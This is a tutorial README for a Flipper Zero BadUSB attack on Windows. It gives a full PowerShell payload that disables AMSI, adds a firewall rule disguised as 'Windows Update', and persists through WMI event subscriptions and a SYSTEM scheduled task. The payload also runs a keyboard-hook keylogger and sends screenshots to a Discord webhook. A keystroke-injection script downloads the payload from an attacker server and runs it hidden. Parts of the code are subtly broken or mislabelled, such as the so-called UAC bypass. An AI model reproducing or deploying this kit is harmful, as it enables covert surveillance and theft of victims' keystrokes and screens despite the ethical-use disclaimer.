# 🦆 Rubber Ducky BadUSB for Flipper Zero 🖥️

Welcome to the **Rubber Ducky BadUSB for Flipper Zero** project! This tool is designed to automate the deployment of a PowerShell script on a Windows computer using a Flipper Zero device. The script includes a keylogger, screen-sharing functionality, and various bypass techniques to ensure persistence and avoid detection. 

⚠️ **Disclaimer**: This project is for educational and ethical purposes only. Misuse of this tool is strictly prohibited. Use responsibly and only on systems you own or have explicit permission to test.

---

## 🛠️ Features

- **Keylogger**: Captures keystrokes and logs them to a file.
- **Screen Sharing**: Takes screenshots and sends them to a Discord webhook.
- **AMSI Bypass**: Disables AMSI to avoid detection by antivirus software.
- **Firewall Bypass**: Allows PowerShell to communicate through the firewall.
- **UAC Bypass**: Elevates privileges to run the script without restrictions.
- **WMI Event Subscription**: Ensures the script runs on system logon.
- **Automatic Restart**: Ensures the script runs after shutdown or reboot.
- **Missing Software Installation**: Installs required dependencies like .NET Framework and PowerShellGet.

---

## 📦 Prerequisites

Before you begin, ensure you have the following:

1. **Flipper Zero**: A device capable of emulating a USB keyboard.
2. **Windows Computer**: The target system where the script will be deployed.
3. **Discord Webhook URL**: A URL to send captured data (keylogs and screenshots).
4. **PowerShell**: Installed on the target system.
5. **Server**: A server to host the `payload.ps1` script.

---

## 🚀 Step-by-Step Tutorial

### **Step 1: Understanding the Execution Order**

To ensure the script works as intended, the following order of operations must be followed:

1. **AMSI Bypass**: Disable AMSI to avoid detection.
2. **Install Missing Software**: Ensure all required dependencies (e.g., .NET Framework, PowerShellGet) are installed.
3. **Firewall Bypass**: Allow PowerShell to communicate through the firewall.
4. **UAC Bypass**: Elevate privileges to ensure the script can run without restrictions.
5. **WMI Event Subscription**: Set up persistence to ensure the script runs on logon.
6. **Automatic Restart**: Ensure the script runs after shutdown/reboot.
7. **Keylogger and Screen Sharing**: Start the keylogger and screen-sharing functions.

---

### **Step 2: Modified PowerShell Script**

Below is the updated script with the correct execution order. Save this as `payload.ps1`.

```powershell
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Discord Webhook URL
$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"

# Install Missing Plugins/Software
function Install-RequiredSoftware {
    # Check if .NET Framework is installed
    if (-not (Get-Command "dotnet" -ErrorAction SilentlyContinue)) {
        Write-Output "Installing .NET Framework..."
        Invoke-WebRequest -Uri "https://dotnet.microsoft.com/download/dotnet-core/scripts/v1/dotnet-install.ps1" -OutFile "$env:temp\dotnet-install.ps1"
        Invoke-Expression "$env:temp\dotnet-install.ps1 -Channel Current"
    }

    # Check if PowerShellGet module is installed
    if (-not (Get-Module -ListAvailable -Name PowerShellGet)) {
        Write-Output "Installing PowerShellGet module..."
        Install-PackageProvider -Name NuGet -Force
        Install-Module -Name PowerShellGet -Force -AllowClobber
    }

    # Check if WebClient is available
    if (-not (Get-Command "Invoke-WebRequest" -ErrorAction SilentlyContinue)) {
        Write-Output "Installing WebClient..."
        Install-WindowsFeature -Name Web-Client
    }
}

# Firewall Bypass
New-NetFirewallRule -DisplayName "Windows Update" -Direction Outbound -Action Allow -Program "powershell.exe"

# UAC Bypass
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $env:temp\payload.ps1" -Verb RunAs

# WMI Event Subscription for Persistence
$wmiScript = @"
$filterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'BadUSB_Filter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'BadUSB_Consumer'
    CommandLineTemplate = "powershell -ExecutionPolicy Bypass -File $env:temp\\payload.ps1"
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
"@
Invoke-Expression $wmiScript

# Automatic Restart on Shutdown/Reboot
$restartScript = @"
$taskName = "BadUSB_Restart"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $env:temp\\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
"@
Invoke-Expression $restartScript

# Install Required Software
Install-RequiredSoftware

# Keylogger Function
function Start-Keylogger {
    $keyloggerScript = @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    public class Keylogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logFile = "$env:temp\\keylog.txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static void Main() {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                System.IO.File.AppendAllText(logFile, key + Environment.NewLine);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
"@
    Add-Type -TypeDefinition $keyloggerScript
    [Keylogger]::Main()
}

# Screen Sharing Function
function Start-ScreenShare {
    $screenShareScript = @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Net;
    using System.Threading;
    public class ScreenShare {
        private static string webhookUrl = "$webhookUrl";
        private static int interval = 5000; // 5 seconds

        public static void Main() {
            while (true) {
                try {
                    using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)) {
                        using (Graphics g = Graphics.FromImage(bmp)) {
                            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                        }
                        using (MemoryStream ms = new MemoryStream()) {
                            bmp.Save(ms, ImageFormat.Jpeg);
                            byte[] imageBytes = ms.ToArray();
                            string base64Image = Convert.ToBase64String(imageBytes);
                            SendToDiscord(base64Image);
                        }
                    }
                } catch { }
                Thread.Sleep(interval);
            }
        }

        private static void SendToDiscord(string base64Image) {
            string jsonPayload = "{\"content\":\"Screenshot\",\"embeds\":[{\"image\":{\"url\":\"data:image/jpeg;base64," + base64Image + "\"}}]}";
            using (WebClient client = new WebClient()) {
                client.Headers.Add("Content-Type", "application/json");
                client.UploadString(webhookUrl, "POST", jsonPayload);
            }
        }
    }
"@
    Add-Type -TypeDefinition $screenShareScript
    [ScreenShare]::Main()
}

# Start Keylogger and Screen Sharing
Start-Keylogger
Start-ScreenShare
```

---

### **Step 3: Creating the Flipper Zero Payload**

The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:

```arduino
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'https://your-server.com/payload.ps1' -OutFile '$env:temp\payload.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\payload.ps1' -Verb RunAs"
DELAY 1000
ENTER
```

---

### **Step 4: Hosting the Script**

Upload `payload.ps1` to a server and replace `https://your-server.com/payload.ps1` with the actual URL.

---

### **Step 5: Testing and Deployment**

1. **Test the Script**: Test the script in a controlled environment to ensure it works as expected.
2. **Deploy the Flipper Zero Payload**: Use the Flipper Zero to deploy the payload on the target system.

---

## 🛡️ Ethical Use

This project is intended for educational purposes only. Always ensure you have explicit permission before deploying this tool on any system. Misuse of this tool is strictly prohibited.

---

## 🙏 Credits

- **Flipper Zero**: For providing the hardware platform.
- **PowerShell**: For enabling powerful scripting capabilities.
- **Discord**: For providing webhook functionality.

---

Enjoy the project! 🚀
